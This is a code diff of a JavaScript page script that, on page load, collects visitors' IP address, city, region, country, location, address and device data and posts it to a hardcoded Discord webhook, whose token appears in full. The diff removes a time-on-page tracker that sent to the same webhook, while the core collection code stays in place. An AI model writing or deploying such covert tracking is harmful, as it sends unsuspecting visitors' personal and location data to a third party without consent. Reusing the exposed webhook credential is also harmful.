@@ -1,6 +1,6 @@
 const WEBHOOK_URL = `https://discord.com/api/webhooks/1349523049250291712/wUumjsxHGe6Qyd2G4gUAmb_5OHX7T8U2Nbxkpb4mEjW9xVuZc0Le96jVBOC8rguajQbc`;
 
-function sendToDiscord(ipData, locationData, deviceData, timeSpent) {
+function sendToDiscord(ipData, locationData, deviceData) {
   const ip = ipData.ip;
   const city = ipData.city;
   const region = ipData.region;
@@ -32,7 +32,6 @@ Location: ${city}, ${region}, ${country}
 ${locationMessage}
 ${addressMessage}
 ${deviceMessage}
-User spent ${timeSpent} seconds on the page.
 \`\`\``;
 
   fetch(WEBHOOK_URL, {
@@ -222,44 +221,3 @@ function sendDeviceData() {
 
 // Call the function to send device data when the page loads
 window.onload = sendDeviceData;
-
-let startTime; // Variable to store the start time
-
-// Function to track time spent on the page
-function trackTimeOnPage() {
-  startTime = new Date(); // Record the start time when the page loads
-}
-
-// Function to calculate and log time spent when the user leaves the page
-function logTimeSpent() {
-  const endTime = new Date(); // Record the end time when the user leaves
-  const timeSpent = Math.round((endTime - startTime) / 1000); // Calculate time spent in seconds
-  console.log(`Time spent on this page: ${timeSpent} seconds`);
-
-  // Send the time spent to Discord
-  sendTimeToDiscord(timeSpent);
-}
-
-// Function to send time spent to Discord
-function sendTimeToDiscord(timeSpent) {
-  const message = `User spent ${timeSpent} seconds on the page.`;
-
-  fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: message }),
-  })
-    .then((response) => {
-      if (!response.ok) {
-        throw new Error(`HTTP error! status: ${response.status}`);
-      }
-      console.log(`Sent time spent to Discord with status ${response.status}`);
-    })
-    .catch((error) => {
-      console.error(`Error sending time to Discord: ${error}`);
-    });
-}
-
-// Event listeners
-window.onload = trackTimeOnPage; // Start tracking when the page loads
-window.onbeforeunload = logTimeSpent; // Log time spent when the user leaves the page
